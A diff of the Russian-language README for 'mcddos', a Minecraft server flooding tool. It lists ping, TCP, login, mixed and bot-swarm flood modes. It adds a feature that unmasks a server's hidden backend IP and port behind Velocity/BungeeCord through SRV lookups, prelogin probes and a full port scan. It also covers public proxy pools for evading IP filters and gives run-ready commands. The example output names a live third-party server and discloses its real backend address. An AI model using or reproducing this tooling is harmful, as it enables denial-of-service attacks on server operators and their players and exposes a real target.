@@ -46,7 +46,7 @@
 | `login` | Полный handshake → login → configuration → play (offline/cracked) |
 | `bot` | Боты подключаются, держат соединение (keepalive i64), пишут в чат, переживают кики |
 | `mixed` | Всё сразу: ping + tcp + login + боты |
-| `realip` | Ищет **реальный IP бэкенда** за Velocity/Bungee (prelogin + subnet-скан) |
+| `realip` | Ищет **реальный IP+порт бэкенда** за Velocity/Bungee: SRV, prelogin, **полный порт-скан хоста 1024..65535** (UUID-ранжирование, login-пробы), subnet-скан |
 | `proxies` | Авто-пул прокси: fetch публичных списков → верификация → переиспользование |
 | `detect` | **Авто-детект**: сам находит версию + реальный IP + капчу/регистрацию |
 | `playtest` | **Заход как реальный игрок**: логин + keepalive + чат + отчёт что произошло |
@@ -54,8 +54,10 @@
 ### Ключевые фишки
 
 - 🚀 **Без зависимостей** — чистый `asyncio` + `zlib`, Python ≥ 3.8.
-- 🎯 **Обход Velocity / BungeeCord** — парсинг prelogin plugin-сообщений,
-  поиск реального backend IP/порта.
+- 🎯 **Обход Velocity / BungeeCord** — скрипт сам находит настоящий IP+порт:
+  SRV-запись, prelogin-сообщения, **MC status-скан всех 65k портов хоста**
+  (бэкенд за Velocity сам себя не раскрывает), ранжирование кандидатов по
+  совпадению UUID онлайн-игроков / MOTD-версии / online-mode кика.
 - 🌐 **Прокси** — `http/https`, `socks4/4a`, `socks5/5h` (DNS через прокси),
   авто-загрузка и верификация публичных списков.
 - 🤖 **Боты** — signed chat (Ed25519, чистый Python), keepalive, reconnect,
@@ -102,34 +104,48 @@ mcddos mixed play.example.com 25565 -v 1.20.4 -w 30 -n 10 -t 120
 ## 🎮 PlayTest — заход как реальный игрок
 
 `tools/playtest.py` — подключается к серверу **как настоящий игрок** и сам
-определяет всё: версию, реальный IP, что произошло (в мире / кик / капча /
-регистрация / whitelist / online mode). Держит соединение (keepalive),
-пишет в чат и выдаёт подробный отчёт.
+определяет всё: **порт (SRV-запись, если не указан)**, версию,
+**реальный IP+порт бэкенда** (SRV + prelogin + полный порт-скан хоста +
+UUID-ранжирование), что произошло (в мире / кик / капча / регистрация /
+whitelist / online mode). Держит соединение (keepalive), пишет в чат,
+при необходимости логинится напрямую на найденный бэкенд и выдаёт подробный отчёт.
 
 ```bash
-# базовый заход (авто-детект версии)
-python3 tools/playtest.py play.example.com 25565
+# базовый заход: порт можно НЕ указывать — скрипт сам возьмёт его из SRV
+# (_minecraft._tcp) и сам найдёт реальный IP+порт бэкенда (~2-2.5 мин)
+python3 tools/playtest.py play.example.com
 
 # с указанием версии и длительностью
 python3 tools/playtest.py play.example.com 25565 -v 1.20.4 --stay 90 --chat "hi"
 
+# быстрый режим: без wide-скана хоста (~15-40 с, но бэкенд может не найтись)
+python3 tools/playtest.py play.example.com --no-host-scan
+
 # через прокси / авто-пул прокси (обход IP-фильтров)
-python3 tools/playtest.py play.example.com 25565 --fetch 300
-python3 tools/playtest.py play.example.com 25565 --proxy socks5://ip:port
+python3 tools/playtest.py play.example.com --fetch 300
+python3 tools/playtest.py play.example.com --proxy socks5://ip:port
 
 # сохранить JSON-отчёт
-python3 tools/playtest.py play.example.com 25565 --out report.json
+python3 tools/playtest.py play.example.com --out report.json
 ```
 
-Результат — JSON + сводка (ниже — **пример вывода**, снят на мок-сервере
-BungeeCord для проверки prelogin; реальные значения зависят от сервера):
+Результат — JSON + сводка. Пример (снято на живом сервере CoreLand,
+фронтенд за SRV 25795, бэкенд найден порт-сканом хоста по UUID игрока):
 ```
-version  : 1.20.4 (protocol 765)
-real IP  : 203.0.113.77 [bungeecord:pre_login:25566 via direct]  # TEST-NET-3 = мок
+=== [0] DNS/TCP :: coreland.go-srv.top:25565 ===
+  SRV _minecraft._tcp -> port 25795 (was 25565); using 25795
+=== [1] Version detect ===
+  -> version Paper 26.1.2 (protocol 775) via direct
+=== [3] Real-IP discovery ===
+  [realip] full MC status scan of 64511 ports on 193.37.71.193 ...
+  [realip] best same-host backend guess: 193.37.71.193:25787 (score 85, match=True)
+
+version  : Paper 26.1.2 (protocol 775)
+real IP  : 193.37.71.193:25787 [same-host-portscan]
 joined   : True  join_game=False
-keeps    : 4  chats=1
 verdict  : JOINED (play state; соединение живое, keepalive ок)
 # либо:  verdict  : CAPTCHA: Please solve the captcha ...
+# либо:  verdict  : ONLINE MODE (нужен аккаунт, cracked не пройдёт)
 ```
 
 ---
@@ -175,7 +191,7 @@ mcddos/                  ← основной пакет (pip install .)
   mcconn.py              # ★ MCConn: handshake->status->login->config->play, прокси, prelogin
   bots.py                # Bot / BotPool: keepalive, signed chat, reconnect, прокси
   ddos.py                # потоки ping/tcp/login/mixed + статистика
-  realip.py              # prelogin probe, find_real_ip, subnet-скан
+  realip.py              # SRV, prelogin, wide-скан портов хоста, login-пробы, find_real_ip
   proxies.py             # parse/fetch (11 источников)/верификация прокси
   cli.py                 # argparse CLI → команда mcddos
   data/packets.json      # ★ ID пакетов по protocol-версии (735..777)
